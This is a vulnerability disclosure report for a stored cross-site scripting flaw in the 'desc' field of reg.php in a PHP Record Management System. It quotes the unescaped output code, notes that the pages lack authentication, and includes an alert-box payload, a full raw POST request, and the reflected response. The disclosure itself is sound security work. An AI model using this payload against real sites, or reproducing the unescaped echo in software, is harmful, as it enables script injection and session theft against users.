# Stored XSS Vulnerability in `reg.php` of the Record Management System

The transaction registration function of the Record Management System is handled by `reg.php`. When a user submits the "Add Transaction" form, the backend reads the `date`, `doc_type`, `desc`, `office`, `status`, `dateo`, `rb`, and `ft` parameters from the POST body. In the code, `reg.php:4-11` directly reads these parameters and inserts them into the `transaction` table via a PDO prepared statement (SQL injection is mitigated), but **no HTML escaping or output sanitization is applied before storage**:

```php
$date = $_POST['date'];
$doc_type = $_POST['doc_type'];
$desc = $_POST['desc'];
...
$sql = "INSERT INTO transaction (date,doc_type,description,office,status,dateout,receive_by,ft) VALUES (:sas,:asas,:asafs,:offff,:statttt,:dot,:rd,:ft)";
$q = $db->prepare($sql);
$q->execute(array(':sas'=>$date, ':asas'=>$doc_type, ':asafs'=>$desc, ...));
```

The stored value is later echoed back unencoded by the transaction list page `main/index.php:116`, which outputs the `description` column directly into an HTML `<td>` without any escaping:

```php
<td><?php echo $row['description']; ?></td>
```

Because the application does not perform HTML escaping or output sanitization on either the write path (`reg.php`) or the read path (`index.php`), an attacker can inject malicious script content through the `desc` parameter. The script is stored in the `transaction` table and executes in the browser of every user who opens the transaction list page, resulting in a stored Cross-Site Scripting (XSS) vulnerability.

This injection point requires no authentication: the application performs zero session checks on all `main/` routes (`reg.php`, `index.php`, etc. contain no `session_start()` and no login-state verification), so any visitor can submit the form and plant a payload. The trigger page `main/index.php` likewise has no authentication, so the payload fires for every visitor who opens the transaction list.

## Impact of the Stored XSS Vulnerability

An attacker can exploit this vulnerability to execute arbitrary JavaScript in the victim's browser within the context of the currently opened page. Because this is a stored XSS, the payload triggers automatically when any user opens the transaction list page — the victim does not need to click a malicious link. This may lead to session theft, sensitive data disclosure, page content manipulation, phishing, or unauthorized actions performed on behalf of the victim.

## Payload

Injection parameter: `desc`

Injected value:

```text
<sCrIpT>alert(9999)</sCrIpT>
```

Request method: `POST`

Request path:

```text
/main/reg.php
```

Raw request:

```http
POST /main/reg.php HTTP/1.1
Host: localhost:8081
Content-Type: application/x-www-form-urlencoded
Content-Length: 138
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:8081/main/add.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=74c2f8c3a5a4bfb15b0dbd4a09cb98e8
Connection: keep-alive

date=08/17/2026&doc_type=Contract&desc=%3CsCrIpT%3Ealert(9999)%3C%2FsCrIpT%3E&office=Dream+Host&status=New&dateo=08/18/2026&rb=auditor&ft=auditor
```

Reflected response snippet (from trigger page `GET /main/index.php`):

```html
        <td>auditor</td>
        <td>Contract</td>
        <td><sCrIpT>alert(9999)</sCrIpT></td>
        <td>Dream Host</td>
        <td>New</td>
```

The response shows that the injected payload is stored in the database and later reflected into the HTML without encoding, which can cause the browser to parse and execute the attacker-controlled script every time the transaction list page is opened.

## Sources Download

```
- [Record Management System in PHP With Source Code - Source Code & Projects](https://code-projects.org/record-management-system-in-php/)
```

![image-20260604115005785](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260604115005785.png)
